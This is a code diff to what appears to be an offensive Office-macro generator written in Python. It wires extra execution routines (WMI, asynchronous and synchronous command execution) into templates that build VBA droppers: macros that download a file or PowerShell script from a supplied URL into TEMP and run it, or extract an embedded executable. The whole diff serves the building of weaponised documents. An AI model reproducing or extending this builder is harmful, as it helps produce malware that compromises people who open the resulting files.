@@ -9,7 +9,9 @@ from modules.mp_module import MpModule
 import vbLib.Meterpreter
 import vbLib.WebMeter
 import vbLib.WscriptExec
+import vbLib.ExecuteCMDAsync
 import vbLib.templates
+import vbLib.WmiExec
 from common.utils import MSTypes
 from collections import OrderedDict
 
@@ -44,9 +46,14 @@ class TemplateToVba(MpModule):
         """ cmd execute template builder """
         paramDict = OrderedDict([("cmdline",None)])      
         self.fillInputParams(paramDict)
+        
+        # add execution functions
+        self.addVBALib(vbLib.WscriptExec)
+        self.addVBALib(vbLib.WmiExec )
+        self.addVBALib(vbLib.ExecuteCMDAsync )
+        
         content = vbLib.templates.CMD
         content = content.replace("<<<CMD>>>", paramDict["cmdline"])
-        content = content + vbLib.WscriptExec.VBA
         vbaFile = self.addVBAModule(content)
         logging.info("   [-] Template %s VBA generated in %s" % (self.template, vbaFile)) 
 
@@ -63,7 +70,10 @@ class TemplateToVba(MpModule):
             paramDict[downloadPathKey] = paramDict[downloadPathKey] + '\n    downloadPath = Environ("TEMP") & "\\" & downloadPath'
 
         # Add required functions
-        self.addVBAModule(vbLib.WscriptExec.VBA)
+        self.addVBALib(vbLib.WscriptExec)
+        self.addVBALib(vbLib.WmiExec )
+        self.addVBALib(vbLib.ExecuteCMDAsync )
+        
 
         content = vbLib.templates.DROPPER
         content = content.replace("<<<URL>>>", paramDict["target_url"])
@@ -88,7 +98,9 @@ class TemplateToVba(MpModule):
             paramDict[downloadPathKey] = paramDict[downloadPathKey] + '\n    downloadPath = Environ("TEMP") & "\\" & downloadPath'
             
         # Add required functions
-        self.addVBAModule(vbLib.WscriptExec.VBA)
+        self.addVBALib(vbLib.WscriptExec)
+        self.addVBALib(vbLib.WmiExec )
+        self.addVBALib(vbLib.ExecuteCMDAsync )
 
         content = vbLib.templates.DROPPER2
         content = content.replace("<<<URL>>>", paramDict["target_url"])
@@ -107,7 +119,9 @@ class TemplateToVba(MpModule):
         self.fillInputParams(paramDict)
 
         # Add required functions
-        self.addVBAModule(vbLib.WscriptExec.VBA)
+        self.addVBALib(vbLib.WscriptExec)
+        self.addVBALib(vbLib.WmiExec )
+        self.addVBALib(vbLib.ExecuteCMDAsync )
 
         content = vbLib.templates.DROPPER_PS
         content = content.replace("<<<POWERSHELL_SCRIPT_URL>>>", paramDict["powershell_script_url"])
@@ -123,6 +137,11 @@ class TemplateToVba(MpModule):
         paramDict = OrderedDict([("extract_path", None)])  
         self.fillInputParams(paramDict)
         logging.info("   [-] Output path when file is extracted: %s" % paramDict["extract_path"])
+
+        # Add required functions
+        self.addVBALib(vbLib.WscriptExec)
+        self.addVBALib(vbLib.WmiExec )
+        self.addVBALib(vbLib.ExecuteCMDAsync )
 
         content = vbLib.templates.EMBED_EXE
         content = content.replace("<<<OUT_FILE>>>", paramDict["extract_path"])
@@ -298,6 +317,7 @@ class TemplateToVba(MpModule):
             self._processCmdTemplate()
             return
         elif self.template == "REMOTE_CMD":
+            self.addVBALib(vbLib.ExecuteCMDSync )
             content = vbLib.templates.REMOTE_CMD
         elif self.template == "EMBED_EXE":
             self._processEmbedExeTemplate()
